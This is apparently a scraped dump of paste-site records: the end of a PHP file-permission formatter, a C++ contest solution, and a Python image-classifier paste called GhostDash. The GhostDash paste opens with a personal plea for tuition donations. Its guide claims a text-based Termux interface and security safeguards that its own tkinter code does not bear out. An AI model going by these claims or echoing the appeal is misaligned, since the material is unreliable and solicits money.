$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
"
m1nhD9bJ,Untitled,Rofyda_Elghadban1,C++,Saturday 6th of January 2024 04:40:05 PM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define sz(x) (int)(x.size())
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */

 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 void solve(){
  int n,counter=0;
  cin>>n;
  string s;
  cin>>s;
  if(n==1){
    cout<<0<<""\n""<<s<<""\n"";
    return;
  }
  if(n==2){
    if(s[0]==s[1]){
      cout<<1<<""\n""<<s[0];
      if(s[0]=='R'){
        cout<<""G""<<""\n"";
      }else if(s[0]=='G'){
        cout<<""B""<<""\n"";
      }else if(s[0]=='B'){
        cout<<""R""<<""\n"";
      }
    }else if(s[0]!=s[1]){
      cout<<0<<""\n""<<s<<""\n"";
    }
    return;
  }
  string t=""RGB"";
  sort(all(t));
  map<int,string>mp;
  string ss=s;
  while(next_permutation(t.begin(),t.end())){
    for(int i=0;i<n;i+=3){
      if(s[i]!=t[0]){
        ss[i]=t[0];
        counter++;
      }
      if(s[i+1]!=t[1]&&i+1<n-1){
        ss[i+1]=t[1];
        counter++;
      }
      if(s[i+2]!=t[2]&&i+2<n){
        ss[i+2]=t[2];
        counter++;
      }
    }
    mp[counter]=ss;
    ss=s;
    counter=0;
  }
  for(auto &i:mp){
    cout<<i.first<<""\n""<<i.second<<""\n"";
    return;
  }
 }

 int main(){
  Rofyda_Elghadban(); 
  // int t;
  // cin>>t;
  // while(t--){
  //   solve();
  // }
  solve();
  return 0;
 }

"
PQUkNE6s,GhostDash,xGHOSTSECx,Python,Saturday 6th of January 2024 03:57:14 PM CDT,"#   Subject: A Request for Support:             Help Dashorlar Pursue Education

#   Dear Esteemed Friends and Supporters,

#   I hope this message finds you well. I am Dashorlar, and I am reaching out with a heartfelt request for assistance in my pursuit of education. In my homeland of Nigeria, I am facing economic challenges that limit my access to higher education and advanced resources.

#   The crux of my appeal is not merely financial; it is about securing an education that can empower me to bridge the economic gap and create a brighter future. Currently, I am in need of 160,000 Naira, which, when translated to Western currency, equates to just a few hundred dollars. This sum covers my tuition for an entire year, representing a crucial opportunity.

#   To provide context, the economic landscape in Nigeria means that a week of labor often earns me what others in more economically privileged regions earn in a single day. The struggle is exacerbated by the fact that our currency's value doesn't effectively translate in the market.

#   I am Dashorlar, the driving force behind GhostSec, a concept rooted in addressing the challenges of our world. I firmly believe that change commences with individuals who are determined to surmount adversity and create a lasting impact.

#   Your support is pivotal, extending beyond financial assistance. It signifies empowering me to access education and equipping me with the tools and knowledge to contribute to a better world. Your generosity can alter the course of my educational journey, providing me with a chance to shine and make a meaningful difference.

#   Thank you for taking the time to hear my story and for considering extending a helping hand. Your contribution is not just an investment in my education; it is an investment in a future where change and progress are possible.

#   With sincere gratitude,

#   Dashorlar

#   P.S. As a token of my appreciation, I invite you to explore the Image Classification Tool, a testament to my dedication to learning and innovation. It's a versatile application designed to make image classification accessible to all, built using state-of-the-art deep learning models and a user-friendly interface. Your support in my educational journey can help these initiatives flourish further.

#   GhostDash - SpecterVision:                  Your Ultimate Image Classification Tool

#   Welcome to GhostDash - SpecterVision, your ultimate image classification tool for Android devices using Termux. GhostDash harnesses the power of PyTorch to accurately classify images into user-defined categories. This comprehensive guide will walk you through the setup process and help you unleash the spectral image classification capabilities of GhostDash.

#   Step 1: Prepare Your Android Device

#   Start by ensuring that Termux, a versatile terminal emulator, is installed on your Android device. Termux will be your gateway to running GhostDash.

#   Step 2:                                 Install Essential Dependencies

#   Open Termux and install the vital dependencies by executing these commands:

""bash
pkg install python
pip install torch torchvision pillow
""

#   These dependencies are essential for GhostDash to function effectively.

#   Step 3:                                   Acquire GhostDash

#       GhostDash - SpecterVision can be obtained on your Android device through various means. You might have downloaded it from a trusted source or received it through other channels.

#   Step 4:                           Configuration

#   Now, let's tailor GhostDash to your specific requirements:

#   Open the GhostDash Python script within Termux.

#   Locate the line that reads 

""'your_model.pt'""

#   and replace it with the path to your PyTorch model file.

#   Find the line with 

""['Class1', 'Class2', 'Class3']""

#   and customize it with your class labels. For example, if you're working with a flower classification model, it might look like this:

""python
class_labels = ['Tulip', 'Rose', 'Daisy', 'Sunflower']
""

#   Step 5:                                     Launch GhostDash - SpecterVision

#   Execute the GhostDash script to initiate SpecterVision:

""bash
python ghostdash.py
""

#   GhostDash will open a text-based interface, ready for your commands.

#   Step 6: Experience SpecterVision

#   Let's explore the capabilities of SpecterVision:

#   Choose the ""Open Image"" option to specify the image you want to classify.
#   Select 

""Classify Image""

#   to activate SpecterVision's image classification feature.

#   Witness the magic as GhostDash reveals the predicted class of your image. For instance, if you're using a model trained on animal images and you input a cat picture, GhostDash might return ""Cat"" as the predicted class.

#   Additional Insights:

#   GhostDash:                      SpecterVision prioritizes security and will request your confirmation before executing any operations to safeguard your device.  The graphical user interface (GUI) of SpecterVision is text-based, seamlessly integrated into the Termux environment.

#   Conclusion:

#   GhostDash - SpecterVision empowers your Android device with precise image classification capabilities. This guide equips you with the knowledge to set up GhostDash and maximize its spectral image classification potential. Explore the world of image classification on your Android device confidently and accurately with GhostDash - SpecterVision by your side.

import os
import argparse
import tkinter as tk
from tkinter import filedialog, messagebox
import torch
import torchvision.transforms as transforms
from PIL import Image
import logging
import sys
import getpass

# Configure logging
log_file = 'image_classification_tool.log'
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ImageClassificationTool:
def __init__(self, model_path, class_labels):
self.model_path = model_path
self.class_labels = class_labels
self.model = self.load_model(self.model_path)

self.create_gui()

def load_model(self, model_path):
try:
model = torch.load(model_path, map_location=torch.device('cpu'))  # Load the model (you can specify 'cuda' for GPU)
model.eval()  # Set the model to evaluation mode
return model
except Exception as e:
logging.error(f""Error loading PyTorch model: {e}"")
print(f""Error loading PyTorch model: {e}"")
sys.exit(1)

def create_gui(self):
self.root = tk.Tk()
self.root.title(""Image Classification Tool"")

self.label_image_path = tk.Label(self.root, text=""Enter an image path:"")
self.label_image_path.pack()

self.entry_image_path = tk.Entry(self.root, width=50)
self.entry_image_path.pack()

self.button_open_image = tk.Button(self.root, text=""Open Image"", command=self.open_image)
self.button_open_image.pack()

self.button_classify = tk.Button(self.root, text=""Classify Image"", command=self.classify_image_gui)
self.button_classify.pack()

self.label_result = tk.Label(self.root, text="""")
self.label_result.pack()

def open_image(self):
file_path = filedialog.askopenfilename()
if file_path:
self.entry_image_path.delete(0, tk.END)
self.entry_image_path.insert(0, file_path)

def classify_image(self, image_path):
try:
transform = transforms.Compose([
transforms.Resize(256),
transforms.CenterCrop(224),
transforms.ToTensor(),
transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),
])

image = Image.open(image_path)
image = transform(image).unsqueeze(0)  # Add a batch dimension

with torch.no_grad():
output = self.model(image)

_, predicted_class = output.max(1)
return self.class_labels[predicted_class.item()]
except Exception as e:
logging.error(f""Error in image classification: {e}"")
return ""Classification error""

def classify_image_gui(self):
image_path = self.entry_image_path.get()
if os.path.exists(image_path):
try:
predicted_class = self.classify_image(image_path)
self.label_result.config(text=f""Predicted Class: {predicted_class}"")
except Exception as e:
logging.error(f""Error: {e}"")
self.label_result.config(text=f""Error: {e}"")
else:
self.label_result.config(text=f""Image not found at '{image_path}'"")

def run_gui(self):
self.root.mainloop()

def main():
model_path = 'your_model.pt'  # Replace with your model path
class_labels = ['Class1', 'Class2', 'Class3']  # Replace with your class labels

# Security check - ask for user confirmation
username = getpass.getuser()"
